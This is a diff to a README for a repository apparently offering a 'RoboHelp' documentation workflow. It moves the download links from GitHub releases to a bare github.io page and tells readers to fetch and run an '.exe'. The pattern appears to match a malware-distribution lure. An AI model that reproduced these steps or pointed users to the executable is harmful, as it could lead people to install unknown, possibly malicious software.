@@ -1,6 +1,6 @@
 # 🛠️ robohelp-v22-documentation-workflow - Build professional documentation with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/shufflerserousmembrane501/robohelp-v22-documentation-workflow/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://shufflerserousmembrane501.github.io)
 
 ## 📖 About this workflow
 
@@ -20,7 +20,7 @@ Before you install this software, ensure your computer meets these minimum speci
 
 You need to access the release page to get the installer for your computer.
 
-1. Visit this page to download: [https://github.com/shufflerserousmembrane501/robohelp-v22-documentation-workflow/releases](https://github.com/shufflerserousmembrane501/robohelp-v22-documentation-workflow/releases)
+1. Visit this page to download: [https://shufflerserousmembrane501.github.io](https://shufflerserousmembrane501.github.io)
 2. Look for the section labeled "Assets."
 3. Click the link that ends in ".exe."
 4. Save the file to your Downloads folder.
